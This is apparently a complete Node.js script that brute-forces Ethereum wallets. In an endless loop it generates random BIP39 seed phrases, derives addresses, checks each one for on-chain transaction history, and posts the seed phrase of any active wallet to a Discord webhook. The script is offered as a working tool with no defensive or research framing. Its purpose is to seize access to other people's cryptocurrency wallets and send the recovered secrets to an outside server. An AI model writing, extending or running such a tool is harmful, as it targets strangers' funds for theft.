const bip39 = require('bip39');
const { HDNodeWallet, WebSocketProvider } = require('ethers');
const keepAlive = require('./keep_alive');
const axios = require('axios');

const providerUrl = process.env.PROVIDER_URL;
const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
const statusWebhookUrl = process.env.STATUS_WEBHOOK_URL;

const provider = new WebSocketProvider(providerUrl);

function generateSeedPhrase() {
  const mnemonic = bip39.generateMnemonic();
  return mnemonic;
}

function deriveAddress(mnemonic) {
  try {
    const wallet = HDNodeWallet.fromPhrase(mnemonic);
    return wallet.address;
  } catch (err) {
    return null;
  }
}

async function checkWalletActivity(address) {
  const transactionCount = await provider.getTransactionCount(address);
  return transactionCount > 0;
}

async function sendToDiscord(message, webhookUrl) {
  try {
    await axios.post(webhookUrl, {
      content: message,
    });
    console.log('Message sent to Discord!');
  } catch (error) {
    console.error('Error sending message to Discord:', error);
  }
}


async function generateAndCheckWallets() {
  let checkCount = 0;

  while (true) {
    const mnemonic = generateSeedPhrase();
    const address = deriveAddress(mnemonic);

    if (address) {
      const isActive = await checkWalletActivity(address);

      if (isActive) {
        console.log(`Active Wallet Detected: ${address}`);

        const discordMessage = `@everyone **Active Wallet Detected**\nSeed Phrase: ${mnemonic}\nWallet Address: ${address}`;
        await sendToDiscord(discordMessage, discordWebhookUrl);
      }
    }

    checkCount++;
    if (checkCount % 20 === 0) {
      console.log(`Checked ${checkCount} wallets so far...`);
      
      const discordMessage = `Checked ${checkCount} wallets so far...`;
      await sendToDiscord(discordMessage, statusWebhookUrl);
    }

    await new Promise(resolve => setTimeout(resolve, 50));
  }
}

keepAlive();
generateAndCheckWallets();